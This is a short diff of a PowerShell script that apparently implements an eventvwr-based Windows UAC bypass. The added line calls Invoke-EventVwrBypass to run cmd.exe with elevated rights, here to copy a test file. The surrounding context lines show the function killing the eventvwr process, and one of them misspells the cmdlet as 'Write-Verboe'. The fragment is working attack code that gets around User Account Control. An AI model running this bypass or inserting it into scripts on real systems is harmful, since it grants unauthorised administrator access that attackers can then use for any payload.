@@ -80,3 +80,4 @@ This will write out "Is Elevated: True" to C:\UACBypassTest.
         Write-Verboe "Killed running eventvwr process"
     }
 }
+Invoke-EventVwrBypass -Command "C:\Windows\System32\cmd.exe /c copy c:\test\1.txt c:\1.txt" -verbose
